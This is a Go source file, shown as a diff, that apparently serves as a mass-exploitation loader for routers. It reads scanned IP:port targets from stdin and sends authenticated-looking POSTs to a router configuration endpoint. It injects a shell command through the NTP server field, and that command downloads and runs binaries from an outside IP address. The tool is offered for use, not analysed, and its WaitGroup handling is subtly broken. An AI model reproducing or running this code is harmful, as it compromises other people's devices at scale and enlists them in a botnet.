@@ -1,0 +1,178 @@
+package main
+
+import (
+	"bufio"
+	"bytes"
+	"encoding/json"
+	"fmt"
+	"io/ioutil"
+	"net/http"
+	"os"
+	"strings"
+	"sync"
+)
+
+// Payload structures
+type InitialPayload struct {
+	Action  string `json:"action"`
+	Options struct {
+		Enable         int      `json:"enable"`
+		CheckIPs       []string `json:"check_ips"`
+		Interval       int      `json:"interval"`
+		RebootInterval int      `json:"reboot_interval"`
+		Agree          int      `json:"agree"`
+	} `json:"options"`
+}
+
+type AdditionalPayload struct {
+	Action string `json:"action"`
+	Data   struct {
+		NtpServer0 string `json:"ntpserver0"`
+		NtpServer1 string `json:"ntpserver1"`
+		Timezone   string `json:"timezone"`
+	} `json:"data"`
+}
+
+func processHost(ipPort string, wg *sync.WaitGroup, worker chan struct{}) {
+	defer wg.Done()
+	defer func() { <-worker }() // Release the worker slot when done
+
+	url := fmt.Sprintf("http://%s/goform/formJsonAjaxReq", ipPort)
+
+	// Different payload structure
+	initialPayload := InitialPayload{
+		Action: "set_online",
+		Options: struct {
+			Enable         int      `json:"enable"`
+			CheckIPs       []string `json:"check_ips"`
+			Interval       int      `json:"interval"`
+			RebootInterval int      `json:"reboot_interval"`
+			Agree          int      `json:"agree"`
+		}{
+			Enable:         0,
+			CheckIPs:       []string{"8.8.8.8", "8.8.4.4"},
+			Interval:       10,
+			RebootInterval: 30,
+			Agree:          1,
+		},
+	}
+
+	additionalPayload := AdditionalPayload{
+		Action: "set_timesetting",
+		Data: struct {
+			NtpServer0 string `json:"ntpserver0"`
+			NtpServer1 string `json:"ntpserver1"`
+			Timezone   string `json:"timezone"`
+		}{
+			NtpServer0: ";$(cd /var;wget http://45.95.146.126/zermips;chmod 777 zermips;./zermips Router.4g;cd /var;wget http://45.95.146.126/zermpsl;chmod 777 zermpsl;./zermpsl Router.4g ; rm -rf spl*)",
+			NtpServer1: "time.ntp.org",
+			Timezone:   "UTC-8",
+		},
+	}
+
+	initialPayloadBytes, err := json.Marshal(initialPayload)
+	if err != nil {
+		fmt.Printf("Error marshaling initial payload: %v\n", err)
+		return
+	}
+
+	additionalPayloadBytes, err := json.Marshal(additionalPayload)
+	if err != nil {
+		fmt.Printf("Error marshaling additional payload: %v\n", err)
+		return
+	}
+
+	headers := map[string]string{
+		"Host":           ipPort,
+		"Content-Length": "136",
+		"User-Agent":     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36",
+		"Content-Type":   "application/json",
+		"Referer":        fmt.Sprintf("http://%s/home.asp", ipPort),
+		"Cookie":         "userLanguage=EN; username=admin",
+		"Connection":     "close",
+	}
+
+	// Send the initial request
+	initialResponse, err := sendRequest(url, initialPayloadBytes, headers)
+	if err != nil {
+		fmt.Printf("Error for %s: %v\n", ipPort, err)
+		return
+	}
+
+	// Check if the response body contains {"status":1}
+	if strings.Contains(string(initialResponse), `{"status":1}`) {
+		fmt.Printf("Initial request to %s was successful.\n", ipPort)
+
+		// Send the additional request only if the initial request was successful
+		additionalResponse, err := sendRequest(url, additionalPayloadBytes, headers)
+		if err != nil {
+			fmt.Printf("Error for %s: %v\n", ipPort, err)
+			return
+		}
+
+		// Check if the response body contains {"status":1}
+		if strings.Contains(string(additionalResponse), `{"status":1}`) {
+			fmt.Printf("Additional request to %s was successful.\n", ipPort)
+		} else {
+			fmt.Printf("Additional request to %s was not successful. Check response for details.\n", ipPort)
+		}
+	}
+}
+
+func sendRequest(url string, payload []byte, headers map[string]string) ([]byte, error) {
+	req, err := http.NewRequest("POST", url, bytes.NewBuffer(payload))
+	if err != nil {
+		return nil, err
+	}
+
+	for key, value := range headers {
+		req.Header.Set(key, value)
+	}
+
+	client := &http.Client{}
+	resp, err := client.Do(req)
+	if err != nil {
+		return nil, err
+	}
+	defer resp.Body.Close()
+
+	body, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return nil, err
+	}
+
+	return body, nil
+}
+
+func main() {
+	// Use WaitGroup for concurrent execution
+	var wg sync.WaitGroup
+
+	// Limit the number of workers (goroutines)
+	worker := make(chan struct{}, 100000) // Set the number of workers
+
+	// Read IP:PORT from zmap output (stdin)
+	scanner := bufio.NewScanner(os.Stdin)
+
+	for scanner.Scan() {
+		ipPort := strings.TrimSpace(scanner.Text())
+
+		// Wait for an available worker slot
+		worker <- struct{}{}
+
+		// Start a new goroutine for each IP:PORT
+		wg.Add(1)
+		go func(ipPort string) {
+			defer wg.Done()
+			processHost(ipPort, &wg, worker)
+		}(ipPort)
+	}
+
+	if err := scanner.Err(); err != nil {
+		fmt.Printf("Error reading from stdin: %v\n", err)
+	}
+
+	// Wait for all goroutines to finish
+	wg.Wait()
+	close(worker)
+}
